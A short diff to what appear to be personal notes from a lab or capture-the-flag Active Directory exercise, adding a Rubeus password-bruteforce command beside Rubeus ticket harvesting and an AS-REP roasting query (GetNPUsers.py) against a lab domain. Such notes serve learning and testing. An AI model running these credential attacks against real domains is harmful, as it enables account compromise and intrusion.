@@ -399,6 +399,11 @@ harvest TGT on domain controller
 rubeus.exe harvest /interval:30
 ```
 
+bruteforce passwords with rubeus
+```
+Rubeus.exe brute /password:Password1 /noticket
+```
+
 Which user account can you query a ticket from with no password?
 ```
 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
